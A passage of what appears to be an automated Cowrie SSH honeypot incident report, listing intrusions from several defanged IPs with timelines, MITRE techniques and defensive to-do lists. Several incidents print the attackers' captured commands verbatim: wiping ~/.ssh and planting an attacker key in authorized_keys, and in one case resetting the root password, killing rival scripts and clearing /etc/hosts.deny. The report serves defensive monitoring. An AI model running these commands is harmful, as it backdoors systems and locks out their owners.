| `2026-05-25 10:38:58` | `cowrie.command.input` |
| `2026-05-25 10:38:58` | `cowrie.command.failed` |
| `2026-05-25 10:38:59` | `cowrie.log.closed` |
| `2026-05-25 10:39:00` | `cowrie.session.params` |
| `2026-05-25 10:39:00` | `cowrie.command.input` |
| `2026-05-25 10:39:00` | `cowrie.session.file_download` |
| `2026-05-25 10:39:00` | `cowrie.log.closed` |
| `2026-05-25 10:39:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.248.159[.]82` to AbuseIPDB if not already reported
- [ ] Block `186.248.159[.]82` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d1093e5e7ac8

| Field | Detail |
|---|---|
| **Source IP** | `186.248.159[.]82` |
| **First Seen** | 2026-05-25 10:39 |
| **Last Seen** | 2026-05-25 10:39 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 10:39:04` | `cowrie.session.connect` |
| `2026-05-25 10:39:04` | `cowrie.client.version` |
| `2026-05-25 10:39:05` | `cowrie.client.kex` |
| `2026-05-25 10:39:06` | `cowrie.login.success` |
| `2026-05-25 10:39:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.248.159[.]82` to AbuseIPDB if not already reported
- [ ] Block `186.248.159[.]82` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ab28ec96688

| Field | Detail |
|---|---|
| **Source IP** | `186.248.159[.]82` |
| **First Seen** | 2026-05-25 10:41 |
| **Last Seen** | 2026-05-25 10:41 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 10:41:31` | `cowrie.session.connect` |
| `2026-05-25 10:41:31` | `cowrie.client.version` |
| `2026-05-25 10:41:31` | `cowrie.client.kex` |
| `2026-05-25 10:41:33` | `cowrie.login.success` |
| `2026-05-25 10:41:34` | `cowrie.session.params` |
| `2026-05-25 10:41:34` | `cowrie.command.input` |
| `2026-05-25 10:41:34` | `cowrie.command.failed` |
| `2026-05-25 10:41:35` | `cowrie.log.closed` |
| `2026-05-25 10:41:35` | `cowrie.session.params` |
| `2026-05-25 10:41:35` | `cowrie.command.input` |
| `2026-05-25 10:41:35` | `cowrie.session.file_download` |
| `2026-05-25 10:41:35` | `cowrie.log.closed` |
| `2026-05-25 10:41:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.248.159[.]82` to AbuseIPDB if not already reported
- [ ] Block `186.248.159[.]82` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-61bd82d416f8

| Field | Detail |
|---|---|
| **Source IP** | `186.248.159[.]82` |
| **First Seen** | 2026-05-25 10:41 |
| **Last Seen** | 2026-05-25 10:41 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 10:41:39` | `cowrie.session.connect` |
| `2026-05-25 10:41:39` | `cowrie.client.version` |
| `2026-05-25 10:41:40` | `cowrie.client.kex` |
| `2026-05-25 10:41:41` | `cowrie.login.success` |
| `2026-05-25 10:41:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.248.159[.]82` to AbuseIPDB if not already reported
- [ ] Block `186.248.159[.]82` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a8b28ece1c8e

| Field | Detail |
|---|---|
| **Source IP** | `186.248.159[.]82` |
| **First Seen** | 2026-05-25 10:44 |
| **Last Seen** | 2026-05-25 10:44 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 10:44:13` | `cowrie.session.connect` |
| `2026-05-25 10:44:13` | `cowrie.client.version` |
| `2026-05-25 10:44:13` | `cowrie.client.kex` |
| `2026-05-25 10:44:15` | `cowrie.login.success` |
| `2026-05-25 10:44:16` | `cowrie.session.params` |
| `2026-05-25 10:44:16` | `cowrie.command.input` |
| `2026-05-25 10:44:16` | `cowrie.command.failed` |
| `2026-05-25 10:44:17` | `cowrie.log.closed` |
| `2026-05-25 10:44:17` | `cowrie.session.params` |
| `2026-05-25 10:44:17` | `cowrie.command.input` |
| `2026-05-25 10:44:17` | `cowrie.session.file_download` |
| `2026-05-25 10:44:17` | `cowrie.log.closed` |
| `2026-05-25 10:44:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.248.159[.]82` to AbuseIPDB if not already reported
- [ ] Block `186.248.159[.]82` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f3a18d3c75e

| Field | Detail |
|---|---|
| **Source IP** | `186.248.159[.]82` |
| **First Seen** | 2026-05-25 10:44 |
| **Last Seen** | 2026-05-25 10:44 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 10:44:21` | `cowrie.session.connect` |
| `2026-05-25 10:44:21` | `cowrie.client.version` |
| `2026-05-25 10:44:22` | `cowrie.client.kex` |
| `2026-05-25 10:44:23` | `cowrie.login.success` |
| `2026-05-25 10:44:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.248.159[.]82` to AbuseIPDB if not already reported
- [ ] Block `186.248.159[.]82` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b30b0d652433

| Field | Detail |
|---|---|
| **Source IP** | `186.248.159[.]82` |
| **First Seen** | 2026-05-25 10:49 |
| **Last Seen** | 2026-05-25 10:49 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 10:49:45` | `cowrie.session.connect` |
| `2026-05-25 10:49:45` | `cowrie.client.version` |
| `2026-05-25 10:49:46` | `cowrie.client.kex` |
| `2026-05-25 10:49:47` | `cowrie.login.success` |
| `2026-05-25 10:49:48` | `cowrie.session.params` |
| `2026-05-25 10:49:48` | `cowrie.command.input` |
| `2026-05-25 10:49:48` | `cowrie.command.failed` |
| `2026-05-25 10:49:49` | `cowrie.log.closed` |
| `2026-05-25 10:49:49` | `cowrie.session.params` |
| `2026-05-25 10:49:49` | `cowrie.command.input` |
| `2026-05-25 10:49:49` | `cowrie.session.file_download` |
| `2026-05-25 10:49:49` | `cowrie.log.closed` |
| `2026-05-25 10:49:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.248.159[.]82` to AbuseIPDB if not already reported
- [ ] Block `186.248.159[.]82` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e7239f83ef2

| Field | Detail |
|---|---|
| **Source IP** | `186.248.159[.]82` |
| **First Seen** | 2026-05-25 10:49 |
| **Last Seen** | 2026-05-25 10:49 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 10:49:53` | `cowrie.session.connect` |
| `2026-05-25 10:49:53` | `cowrie.client.version` |
| `2026-05-25 10:49:54` | `cowrie.client.kex` |
| `2026-05-25 10:49:55` | `cowrie.login.success` |
| `2026-05-25 10:49:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.248.159[.]82` to AbuseIPDB if not already reported
- [ ] Block `186.248.159[.]82` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f83fcbb22c60

| Field | Detail |
|---|---|
| **Source IP** | `186.248.159[.]82` |
| **First Seen** | 2026-05-25 10:52 |
| **Last Seen** | 2026-05-25 10:52 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 10:52:29` | `cowrie.session.connect` |
| `2026-05-25 10:52:29` | `cowrie.client.version` |
| `2026-05-25 10:52:29` | `cowrie.client.kex` |
| `2026-05-25 10:52:31` | `cowrie.login.success` |
| `2026-05-25 10:52:31` | `cowrie.session.params` |
| `2026-05-25 10:52:31` | `cowrie.command.input` |
| `2026-05-25 10:52:31` | `cowrie.command.failed` |
| `2026-05-25 10:52:32` | `cowrie.log.closed` |
| `2026-05-25 10:52:33` | `cowrie.session.params` |
| `2026-05-25 10:52:33` | `cowrie.command.input` |
| `2026-05-25 10:52:33` | `cowrie.session.file_download` |
| `2026-05-25 10:52:33` | `cowrie.log.closed` |
| `2026-05-25 10:52:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.248.159[.]82` to AbuseIPDB if not already reported
- [ ] Block `186.248.159[.]82` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-505fd97d9a0e

| Field | Detail |
|---|---|
| **Source IP** | `186.248.159[.]82` |
| **First Seen** | 2026-05-25 10:52 |
| **Last Seen** | 2026-05-25 10:52 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 10:52:37` | `cowrie.session.connect` |
| `2026-05-25 10:52:37` | `cowrie.client.version` |
| `2026-05-25 10:52:37` | `cowrie.client.kex` |
| `2026-05-25 10:52:39` | `cowrie.login.success` |
| `2026-05-25 10:52:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.248.159[.]82` to AbuseIPDB if not already reported
- [ ] Block `186.248.159[.]82` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-042bdbdb683a

| Field | Detail |
|---|---|
| **Source IP** | `186.248.159[.]82` |
| **First Seen** | 2026-05-25 10:57 |
| **Last Seen** | 2026-05-25 10:58 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 10:57:54` | `cowrie.session.connect` |
| `2026-05-25 10:57:54` | `cowrie.client.version` |
| `2026-05-25 10:57:55` | `cowrie.client.kex` |
| `2026-05-25 10:57:56` | `cowrie.login.success` |
| `2026-05-25 10:57:57` | `cowrie.session.params` |
| `2026-05-25 10:57:57` | `cowrie.command.input` |
| `2026-05-25 10:57:57` | `cowrie.command.failed` |
| `2026-05-25 10:57:58` | `cowrie.log.closed` |
| `2026-05-25 10:57:58` | `cowrie.session.params` |
| `2026-05-25 10:57:58` | `cowrie.command.input` |
| `2026-05-25 10:57:59` | `cowrie.session.file_download` |
| `2026-05-25 10:57:59` | `cowrie.log.closed` |
| `2026-05-25 10:58:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.248.159[.]82` to AbuseIPDB if not already reported
- [ ] Block `186.248.159[.]82` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-858a71b6a935

| Field | Detail |
|---|---|
| **Source IP** | `186.248.159[.]82` |
| **First Seen** | 2026-05-25 10:58 |
| **Last Seen** | 2026-05-25 10:58 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 10:58:03` | `cowrie.session.connect` |
| `2026-05-25 10:58:03` | `cowrie.client.version` |
| `2026-05-25 10:58:03` | `cowrie.client.kex` |
| `2026-05-25 10:58:05` | `cowrie.login.success` |
| `2026-05-25 10:58:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.248.159[.]82` to AbuseIPDB if not already reported
- [ ] Block `186.248.159[.]82` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03c7a086bfcd

| Field | Detail |
|---|---|
| **Source IP** | `49.207.240[.]8` |
| **First Seen** | 2026-05-25 12:29 |
| **Last Seen** | 2026-05-25 12:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 12:29:56` | `cowrie.session.connect` |
| `2026-05-25 12:29:56` | `cowrie.client.version` |
| `2026-05-25 12:29:56` | `cowrie.client.kex` |
| `2026-05-25 12:29:56` | `cowrie.login.success` |
| `2026-05-25 12:29:56` | `cowrie.session.params` |
| `2026-05-25 12:29:56` | `cowrie.command.input` |
| `2026-05-25 12:29:56` | `cowrie.command.failed` |
| `2026-05-25 12:29:56` | `cowrie.log.closed` |
| `2026-05-25 12:29:56` | `cowrie.session.params` |
| `2026-05-25 12:29:56` | `cowrie.command.input` |
| `2026-05-25 12:29:56` | `cowrie.session.file_download` |
| `2026-05-25 12:29:56` | `cowrie.log.closed` |
| `2026-05-25 12:29:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.207.240[.]8` to AbuseIPDB if not already reported
- [ ] Block `49.207.240[.]8` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d87cb1d93e7

| Field | Detail |
|---|---|
| **Source IP** | `49.207.240[.]8` |
| **First Seen** | 2026-05-25 12:29 |
| **Last Seen** | 2026-05-25 12:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 12:29:58` | `cowrie.session.connect` |
| `2026-05-25 12:29:58` | `cowrie.client.version` |
| `2026-05-25 12:29:58` | `cowrie.client.kex` |
| `2026-05-25 12:29:58` | `cowrie.login.success` |
| `2026-05-25 12:29:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.207.240[.]8` to AbuseIPDB if not already reported
- [ ] Block `49.207.240[.]8` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d48717a46b3

| Field | Detail |
|---|---|
| **Source IP** | `175.178.33[.]230` |
| **First Seen** | 2026-05-25 12:41 |
| **Last Seen** | 2026-05-25 12:42 |
| **Session Duration** | 36s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:wEJj4dXBF8H8"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 12:41:42` | `cowrie.session.connect` |
| `2026-05-25 12:41:42` | `cowrie.client.version` |
| `2026-05-25 12:41:42` | `cowrie.client.kex` |
| `2026-05-25 12:41:43` | `cowrie.login.success` |
| `2026-05-25 12:41:43` | `cowrie.session.params` |
| `2026-05-25 12:41:43` | `cowrie.command.input` |
| `2026-05-25 12:41:43` | `cowrie.command.failed` |
| `2026-05-25 12:41:43` | `cowrie.log.closed` |
| `2026-05-25 12:41:44` | `cowrie.session.params` |
| `2026-05-25 12:41:44` | `cowrie.command.input` |
| `2026-05-25 12:41:44` | `cowrie.session.file_download` |
| `2026-05-25 12:41:44` | `cowrie.log.closed` |
| `2026-05-25 12:42:12` | `cowrie.session.params` |
| `2026-05-25 12:42:12` | `cowrie.command.input` |
| `2026-05-25 12:42:12` | `cowrie.log.closed` |
| `2026-05-25 12:42:12` | `cowrie.session.params` |
| `2026-05-25 12:42:12` | `cowrie.command.input` |
| `2026-05-25 12:42:13` | `cowrie.log.closed` |
| `2026-05-25 12:42:13` | `cowrie.session.params` |
| `2026-05-25 12:42:13` | `cowrie.command.input` |
| `2026-05-25 12:42:13` | `cowrie.session.file_download` |
| `2026-05-25 12:42:13` | `cowrie.log.closed` |
| `2026-05-25 12:42:13` | `cowrie.session.params` |
| `2026-05-25 12:42:13` | `cowrie.command.input` |
| `2026-05-25 12:42:13` | `cowrie.log.closed` |
| `2026-05-25 12:42:14` | `cowrie.session.params` |
| `2026-05-25 12:42:14` | `cowrie.command.input` |
| `2026-05-25 12:42:14` | `cowrie.log.closed` |
| `2026-05-25 12:42:14` | `cowrie.session.params` |
| `2026-05-25 12:42:14` | `cowrie.command.input` |
| `2026-05-25 12:42:14` | `cowrie.command.input` |
| `2026-05-25 12:42:14` | `cowrie.log.closed` |
| `2026-05-25 12:42:14` | `cowrie.session.params` |
| `2026-05-25 12:42:14` | `cowrie.command.input` |
| `2026-05-25 12:42:15` | `cowrie.log.closed` |
| `2026-05-25 12:42:15` | `cowrie.session.params` |
| `2026-05-25 12:42:15` | `cowrie.command.input` |
| `2026-05-25 12:42:15` | `cowrie.log.closed` |
| `2026-05-25 12:42:15` | `cowrie.session.params` |
| `2026-05-25 12:42:15` | `cowrie.command.input` |
| `2026-05-25 12:42:15` | `cowrie.log.closed` |
| `2026-05-25 12:42:16` | `cowrie.session.params` |
| `2026-05-25 12:42:16` | `cowrie.command.input` |
| `2026-05-25 12:42:16` | `cowrie.log.closed` |
| `2026-05-25 12:42:16` | `cowrie.session.params` |
| `2026-05-25 12:42:16` | `cowrie.command.input` |
| `2026-05-25 12:42:16` | `cowrie.log.closed` |
| `2026-05-25 12:42:16` | `cowrie.session.params` |
| `2026-05-25 12:42:16` | `cowrie.command.input` |
| `2026-05-25 12:42:17` | `cowrie.log.closed` |
| `2026-05-25 12:42:17` | `cowrie.session.params` |
| `2026-05-25 12:42:17` | `cowrie.command.input` |
| `2026-05-25 12:42:17` | `cowrie.log.closed` |
| `2026-05-25 12:42:17` | `cowrie.session.params` |
| `2026-05-25 12:42:17` | `cowrie.command.input` |
| `2026-05-25 12:42:17` | `cowrie.log.closed` |
| `2026-05-25 12:42:18` | `cowrie.session.params` |
| `2026-05-25 12:42:18` | `cowrie.command.input` |
| `2026-05-25 12:42:18` | `cowrie.log.closed` |
| `2026-05-25 12:42:18` | `cowrie.session.params` |
| `2026-05-25 12:42:18` | `cowrie.command.input` |
| `2026-05-25 12:42:18` | `cowrie.log.closed` |
| `2026-05-25 12:42:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `175.178.33[.]230` to AbuseIPDB if not already reported
- [ ] Block `175.178.33[.]230` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-50a751ca0a4f

| Field | Detail |
|---|---|
| **Source IP** | `14.103.117[.]141` |
| **First Seen** | 2026-05-25 13:04 |
| **Last Seen** | 2026-05-25 13:04 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
